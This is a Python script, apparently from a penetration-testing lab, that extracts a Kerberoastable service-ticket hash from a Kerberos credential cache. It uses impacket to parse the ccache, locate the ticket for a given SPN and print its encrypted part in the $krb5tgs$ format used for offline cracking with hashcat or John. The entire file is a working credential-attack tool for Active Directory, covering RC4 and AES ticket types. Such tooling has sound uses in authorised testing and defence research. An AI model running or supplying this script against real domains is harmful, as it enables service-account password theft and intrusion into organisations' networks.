#!/usr/bin/env python3
"""Extract a roastable $krb5tgs$ hash from a Kerberos credential cache.

The service ticket is obtained with the native MIT client (kinit + kvno), which interoperates
cleanly with a Samba AD DC. This script only parses the resulting ccache -- no network, no
Kerberos checksum negotiation -- and prints the ticket's encrypted part in the John / hashcat
$krb5tgs$ format, exactly as impacket's GetUserSPNs would.

Usage: roast.py CCACHE_PATH SPN
"""
import sys
from binascii import hexlify

from pyasn1.codec.der import decoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import Ticket
from impacket.krb5.ccache import CCache


def main():
    if len(sys.argv) != 3:
        sys.stderr.write(__doc__)
        return 2
    ccache_path, spn = sys.argv[1], sys.argv[2]

    ccache = CCache.loadFile(ccache_path)
    for cred in ccache.credentials:
        server = cred['server'].prettyPrint().decode('utf-8', 'replace')
        if server.split('@')[0].lower() != spn.lower():
            continue
        realm = cred['server'].realm['data']
        realm = realm.decode() if isinstance(realm, bytes) else str(realm)
        # CCache stores the ticket as a 4-byte big-endian length prefix followed by the DER
        # Ticket (APPLICATION 1); strip the prefix before decoding.
        raw = cred.ticket.getData()[4:]
        ticket = decoder.decode(raw, asn1Spec=Ticket())[0]
        etype = int(ticket['enc-part']['etype'])
        blob = bytes(ticket['enc-part']['cipher'].asOctets())

        if etype == constants.EncryptionTypes.rc4_hmac.value:  # 23 -> hashcat 13100
            print('$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                etype, spn.split('/')[0], realm, spn,
                hexlify(blob[:16]).decode(), hexlify(blob[16:]).decode()))
        else:  # AES 17/18 -> hashcat 19600/19700
            print('$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                etype, spn.split('/')[0], realm, spn,
                hexlify(blob[-12:]).decode(), hexlify(blob[:-12]).decode()))
        return 0

    sys.stderr.write('no service ticket for %s found in %s\n' % (spn, ccache_path))
    return 1


if __name__ == '__main__':
    sys.exit(main())
